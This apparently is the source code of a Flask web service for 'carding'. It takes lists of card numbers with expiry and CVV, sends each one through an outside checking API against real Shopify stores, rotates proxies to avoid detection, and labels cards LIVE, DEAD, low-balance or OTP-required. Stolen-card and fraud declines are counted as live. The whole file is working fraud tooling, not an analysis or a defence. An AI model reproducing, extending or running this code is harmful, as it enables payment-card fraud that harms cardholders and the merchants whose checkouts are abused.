import os
import json
import random
import re
import time
import asyncio
import aiohttp
import psycopg2
import psycopg2.pool
from flask import Flask, render_template, request, jsonify
from dotenv import load_dotenv
from collections import deque

load_dotenv()

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "mlsn-web-checker-secret")
app.config['MAX_CONTENT_LENGTH'] = 200 * 1024 * 1024

DATABASE_URL = os.getenv("DATABASE_URL", "")
SAC_API = os.getenv("SAC_API", "https://sac-1-qg37.onrender.com")

DB_POOL = None
DB_POOL_MIN = 2
DB_POOL_MAX = 20

DEFAULT_SHOPIFY_SITES = [
    "https://reston-lloyd.myshopify.com",
    "https://favorstoday.com",
    "https://happyhentreats.com",
    "https://shop.yorkspacesystems.com",
    "https://davids-toothpaste.myshopify.com"
]

RECENT_SITES = deque(maxlen=50)
RECENT_PROXIES = deque(maxlen=50)

CHARGED_KEYWORDS = frozenset([
    'charged', 'charge success', 'charge_success',
    'order complete', 'order_complete', 'order completed', 'order_completed',
    'order confirmed', 'order_confirmed',
    'order placed', 'order_placed',
    'thank you', 'thankyou', 'thank_you',
    'captured', 'capture_succeeded', 'capture succeeded',
    'paid', 'settled', 'succeeded',
    'payment successful', 'payment_successful', 'payment success',
    'payment complete', 'payment_complete', 'payment_completed',
    'purchase complete', 'purchase_complete',
    'transaction approved', 'transaction_approved', 'transaction successful',
    'transaction_successful',
    'sale approved', 'sale_approved',
    'cnb', 'amount_charged',
])

SHOPIFY_WEB_ERROR_KEYWORDS = [
    'web_error', 'shopify_web_error', 'site_error', 'gateway_error',
    'bad_request', 'server_error', 'internal_error', 'temporarily_unavailable',
    'maintenance', 'under_construction', 'try_again_later',
    'shopify店铺错误', '店铺维护中',
]

SHOPIFY_3DS_KEYWORDS = [
    '3d_secure', '3ds', 'three_d_secure', 'three d secure',
    'authentication_required', 'requires_action', 'payer_action',
    'redirect_to_3ds', 'challenge_required',
]


def get_db():
    global DB_POOL
    try:
        if DB_POOL is None:
            DB_POOL = psycopg2.pool.ThreadedConnectionPool(
                DB_POOL_MIN, DB_POOL_MAX,
                DATABASE_URL,
                connect_timeout=10
            )
        return DB_POOL.getconn()
    except Exception as e:
        print(f"DB connection error: {e}")
        return None


def release_db(conn):
    global DB_POOL
    if conn and DB_POOL:
        try:
            DB_POOL.putconn(conn)
        except:
            try:
                conn.close()
            except:
                pass


def get_sites():
    conn = get_db()
    if not conn:
        return DEFAULT_SHOPIFY_SITES.copy()
    try:
        with conn.cursor() as cur:
            cur.execute("SELECT DISTINCT url FROM sites ORDER BY url")
            sites = [row[0] for row in cur.fetchall() if row[0]]
            return sites if sites else DEFAULT_SHOPIFY_SITES.copy()
    except Exception as e:
        print(f"Error getting sites: {e}")
        return DEFAULT_SHOPIFY_SITES.copy()
    finally:
        release_db(conn)


def get_proxies():
    conn = get_db()
    if not conn:
        return []
    try:
        with conn.cursor() as cur:
            cur.execute("SELECT DISTINCT proxy FROM proxies ORDER BY proxy")
            return [row[0] for row in cur.fetchall() if row[0]]
    except Exception as e:
        print(f"Error getting proxies: {e}")
        return []
    finally:
        release_db(conn)


def pick_random_site(sites):
    if not sites:
        return ""
    available = [s for s in sites if s not in RECENT_SITES]
    if not available:
        RECENT_SITES.clear()
        available = sites
    choice = random.choice(available)
    RECENT_SITES.append(choice)
    return choice


def pick_random_proxy(proxies):
    if not proxies:
        return ""
    available = [p for p in proxies if p not in RECENT_PROXIES]
    if not available:
        RECENT_PROXIES.clear()
        available = proxies
    choice = random.choice(available)
    RECENT_PROXIES.append(choice)
    return choice


def format_proxy_for_api(proxy_raw):
    if not proxy_raw:
        return ""
    clean = proxy_raw.strip()
    if "://" in clean:
        clean = clean.split("://", 1)[1]
    if "@" in clean:
        return clean
    parts = clean.split(":")
    if len(parts) == 4:
        ip, port, user, passwd = parts
        return f"{user}:{passwd}@{ip}:{port}"
    elif len(parts) == 2:
        return clean
    return proxy_raw


def parse_cards(text):
    cards = []
    lines = [line.strip() for line in text.split('\n') if line.strip()]
    for line in lines:
        card_str = line.strip()
        card_str = re.sub(r'\s+', ' ', card_str)

        match = re.search(r'(\d{13,19})\s*[|/]\s*(\d{1,2})\s*[|/]\s*(\d{2,4})\s*[|/]\s*(\d{3,4})', card_str)
        if match:
            cards.append({
                'cc': match.group(1),
                'mm': match.group(2).zfill(2),
                'yy': match.group(3)[-2:],
                'cvv': match.group(4),
                'formatted': f"{match.group(1)}|{match.group(2).zfill(2)}|{match.group(3)}|{match.group(4)}"
            })
            continue

        match = re.search(r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})', card_str)
        if match:
            cards.append({
                'cc': match.group(1),
                'mm': match.group(2).zfill(2),
                'yy': match.group(3)[-2:],
                'cvv': match.group(4),
                'formatted': f"{match.group(1)}|{match.group(2).zfill(2)}|{match.group(3)}|{match.group(4)}"
            })

    return cards


def classify_response(api_response):
    combined = api_response.lower().strip().replace('_', ' ').replace('-', ' ')
    raw = api_response.lower().strip()

    if any(k in combined for k in CHARGED_KEYWORDS):
        return "LIVE", "🔥"
    if any(k in raw for k in ["fraud", "fraudulent", "high risk", "high_risk", "risk_review", "risk review", "suspicious", "do_not_honor", "do not honor", "pickup_card", "pickup card", "lost_card", "lost card", "stolen_card", "stolen card"]):
        return "LIVE", "🎆"
    if any(k in raw for k in ["cvv", "ccn", "avs", "security code", "incorrect cvc", "incorrect_cvc", "cvc mismatch", "cvc_mismatch", "cvv mismatch", "cvv_mismatch", "avs mismatch", "avs_mismatch", "address mismatch", "address_mismatch", "zip code", "postal code", "billing address mismatch", "billing_address_mismatch"]):
        return "LIVE", "✅"
    if any(k in raw for k in ["insufficient", "low balance", "low_balance", "funds", "not enough", "limit exceeded", "credit limit"]):
        return "LOW_BALANCE", "🎆"
    if any(k in raw for k in ["otp", "3d secure", "3d_secure", "3ds", "three_d_secure", "authentication required", "authentication_required", "requires_action", "payer_action", "payer_action_required", "redirect_to_3ds", "challenge", "vbv", "securecode", "sca_required", "sca required"]) or any(k in raw for k in SHOPIFY_3DS_KEYWORDS):
        return "OTP_REQUIRED", "✅"
    if "approved" in combined or "authorized" in combined or "authorised" in combined:
        if not any(neg in combined for neg in ("not approved", "unapproved", "not authorized", "declined")):
            return "LIVE", "✅"
    if any(k in raw for k in SHOPIFY_WEB_ERROR_KEYWORDS):
        return "ERROR", "⚠️"
    if any(k in raw for k in ["declined", "dead", "invalid", "failed", "rejected", "blocked", "card declined", "card_declined", "generic decline", "generic_decline", "do not honor", "do_not_honor"]):
        return "DEAD", "❌"
    if "error" in raw:
        return "ERROR", "⚠️"
    return "UNKNOWN", "⚠️"


async def check_card(session, card, site, proxy_raw):
    cc = card.get('formatted', '')
    proxy_converted = format_proxy_for_api(proxy_raw) if proxy_raw else ""
    url = f"{SAC_API}/mlsn?cc={cc}&site={site}"
    if proxy_converted:
        url += f"&proxy={proxy_converted}"

    try:
        timeout = aiohttp.ClientTimeout(total=90)
        async with session.get(url, timeout=timeout, ssl=False) as resp:
            try:
                raw = await resp.json(content_type=None)
            except:
                text = await resp.text()
                text = re.sub(r'<[^>]+>', '', text).strip()[:200]
                return {
                    'status': 'ERROR',
                    'msg': text,
                    'emoji': '⚠️',
                    'price': '-',
                    'gateway': 'Shopify',
                    'site': site,
                    'receipt_id': 'N/A'
                }

            api_response = str(raw.get("Response") or raw.get("response") or raw.get("message") or "").strip()
            price_raw = raw.get("Price") or raw.get("price") or raw.get("amount") or "-"
            currency = str(raw.get("Currency") or raw.get("currency") or "").strip()
            status_field = raw.get("Status") or raw.get("status") or ""
            check_time = raw.get("Time") or raw.get("time") or raw.get("elapsed") or ""

            if price_raw and str(price_raw) not in ("-", ""):
                try:
                    price_val = f"{float(str(price_raw)):.2f}"
                    price_raw = f"{price_val} {currency}" if currency else f"${price_val}"
                except:
                    price_raw = f"{price_raw} {currency}" if currency else str(price_raw)

            gateway = raw.get("Gateway") or raw.get("gateway") or raw.get("Gate") or "Shopify Payments"
            receipt_id = str(raw.get("receipt_id") or raw.get("Receipt ID") or raw.get("receipt_ID") or "N/A").strip()

            status, emoji = classify_response(api_response)

            return {
                'status': status,
                'msg': api_response,
                'emoji': emoji,
                'price': str(price_raw),
                'gateway': gateway,
                'site': site,
                'receipt_id': receipt_id,
                'time': str(check_time) if check_time else "-",
                'api_status': str(status_field) if status_field else ""
            }
    except asyncio.TimeoutError:
        return {
            'status': 'TIMEOUT',
            'msg': 'Request Timeout (90s)',
            'emoji': '⏰',
            'price': '-',
            'gateway': 'Shopify',
            'site': site,
            'receipt_id': 'N/A'
        }
    except Exception as e:
        return {
            'status': 'EXCEPTION',
            'msg': str(e)[:100],
            'emoji': '🔥',
            'price': '-',
            'gateway': 'Shopify',
            'site': site,
            'receipt_id': 'N/A'
        }


async def check_cards_batch(cards, sites, proxies, concurrency=5000):
    semaphore = asyncio.Semaphore(concurrency)
    results = []

    connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, ttl_dns_cache=300, use_dns_cache=True)

    async def check_one(card, session):
        async with semaphore:
            site = pick_random_site(sites) if sites else ""
            proxy = pick_random_proxy(proxies) if proxies else ""
            result = await check_card(session, card, site, proxy)
            result['card'] = card.get('formatted', '')
            return result

    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [check_one(card, session) for card in cards]
        for coro in asyncio.as_completed(tasks):
            result = await coro
            results.append(result)

    return results


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/api/check', methods=['POST'])
def api_check():
    data = request.json
    cards_text = data.get('cards', '')
    mode = data.get('mode', 'sac')

    cards = parse_cards(cards_text)
    if not cards:
        return jsonify({'error': 'No valid cards found'}), 400

    sites = get_sites()
    proxies = get_proxies()

    concurrency = 5000 if mode == 'msac' else 5000

    loop = asyncio.new_event_loop()
    try:
        results = loop.run_until_complete(check_cards_batch(cards, sites, proxies, concurrency))
    finally:
        loop.close()

    stats = {
        'total': len(results),
        'live': sum(1 for r in results if r['status'] == 'LIVE'),
        'dead': sum(1 for r in results if r['status'] == 'DEAD'),
        'error': sum(1 for r in results if r['status'] in ('ERROR', 'TIMEOUT', 'EXCEPTION')),
        'low_balance': sum(1 for r in results if r['status'] == 'LOW_BALANCE'),
        'otp': sum(1 for r in results if r['status'] == 'OTP_REQUIRED'),
    }

    return jsonify({'results': results, 'stats': stats})


@app.route('/api/check/upload', methods=['POST'])
def api_check_upload():
    if 'file' not in request.files:
        return jsonify({'error': 'No file uploaded'}), 400

    file = request.files['file']
    mode = request.form.get('mode', 'sac')

    if not file.filename:
        return jsonify({'error': 'No file selected'}), 400

    content = file.read().decode('utf-8', errors='ignore')
    cards = parse_cards(content)

    if not cards:
        return jsonify({'error': 'No valid cards found in file'}), 400

    sites = get_sites()
    proxies = get_proxies()

    concurrency = 5000 if mode == 'msac' else 5000

    loop = asyncio.new_event_loop()
    try:
        results = loop.run_until_complete(check_cards_batch(cards, sites, proxies, concurrency))
    finally:
        loop.close()

    stats = {
        'total': len(results),
        'live': sum(1 for r in results if r['status'] == 'LIVE'),
        'dead': sum(1 for r in results if r['status'] == 'DEAD'),
        'error': sum(1 for r in results if r['status'] in ('ERROR', 'TIMEOUT', 'EXCEPTION')),
        'low_balance': sum(1 for r in results if r['status'] == 'LOW_BALANCE'),
        'otp': sum(1 for r in results if r['status'] == 'OTP_REQUIRED'),
    }

    return jsonify({'results': results, 'stats': stats})


@app.route('/api/stats', methods=['GET'])
def api_stats():
    sites = get_sites()
    proxies = get_proxies()
    return jsonify({
        'sites_count': len(sites),
        'proxies_count': len(proxies),
        'api_url': SAC_API
    })


if __name__ == '__main__':
    port = int(os.getenv('PORT', 8000))
    app.run(host='0.0.0.0', port=port, debug=True)
